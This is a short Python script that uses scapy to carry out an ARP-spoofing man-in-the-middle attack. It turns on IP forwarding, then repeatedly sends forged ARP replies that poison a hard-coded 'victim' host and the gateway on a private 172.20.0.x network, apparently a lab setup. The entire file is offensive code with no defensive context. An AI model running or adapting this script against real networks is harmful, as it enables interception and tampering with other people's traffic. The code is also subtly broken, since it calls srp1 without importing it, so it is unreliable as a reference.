#!/usr/bin/env python3
import os
import time
from scapy.all import ARP, Ether, sendp


def enable_ip_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def get_mac(ip):
    ans = srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
    if ans:
        return ans.hwsrc
    return None


def spoof(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op="is-at")
        sendp(arp_response, verbose=0)
        print(f"[+] Sent spoofed ARP to {target_ip}")


if __name__ == "__main__":
    vitima = "172.20.0.3"
    gateway = "172.20.0.1"

    enable_ip_forwarding()
    print("[*] MITM Attack Started (ARP Spoofing)")

    try:
        while True:
            spoof(vitima, gateway)
            spoof(gateway, vitima)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Attack Stopped")
